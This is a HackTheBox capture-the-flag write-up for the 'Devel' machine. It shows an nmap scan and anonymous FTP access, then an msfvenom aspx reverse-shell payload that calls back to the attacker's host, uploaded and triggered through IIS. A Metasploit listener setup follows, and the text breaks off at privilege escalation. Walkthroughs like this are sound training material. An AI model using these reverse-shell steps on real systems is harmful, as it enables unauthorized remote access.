# Devel
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/08fa0240-d04c-403e-8edd-e524f901862f)

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.10.5 --min-rate 1000  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-08 07:35 PDT
Nmap scan report for 10.10.10.5
Host is up (0.026s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.08 seconds
```

1. Based from the nmap results, the machine runs a web application and opens a anonymous ftp login.


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/56e020b6-16b2-4033-9849-e486a2b6f17f)


2. Did a small research about the service version for http, found a CVE that could be our interest -> https://www.exploit-db.com/exploits/15803


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e88dcd00-0758-481f-98d1-98661800d40d)


3. Anyway, let's login to ftp first.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bd844e68-ee68-4ff0-a8fd-af981fb44c59)


4. Traversing the directory found no files at all.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/90f5c1ab-37e1-4bbe-8e45-be4c8db31907)


5. Thing to note, since we're in a ftp server, we **need to check** if we can upload a file from our local machine to this ftp server.
6. For example let's make our reverse shell payload using **msfvenom**.
7. We want to save the payload in asp or aspx format file. Why?? Because IIS execute that file.

> COMMAND 

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.20 lport=1337 -f aspx > reverse_shell.aspx
```

### FLOW

```
1. Create reverse shell payload using msfvenom.
2. Set listener on the specfied port.
3. run put file.aspx on the ftp server (to download the file from our local machine).
4. Then trigger the reverse shell payload by accessing it --> http://ip/file.aspx.
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/715111d5-aa90-4e10-a0b3-f1bb3f093642)


8. It's stuck there, confused why.
9. Succeed got shell after used the msfconsole listener.


> How to setup

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 1337
exploit
```


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/126da244-7e93-469e-b608-c196d4208828)


10. Seems like we need to do privesc even to get the user flag.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c4fb1d32-d90a-4cf4-9227-6d5068d87d18)


11. Let's run a suggester.
12. Running ps, we know that we don't need to migrate. Because w3wp.exe is used to run webapp for IIS.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/14b507b2-7327-4695-9c1c-fd730e8b65ed)


> RESULT FOR SUGGESTER

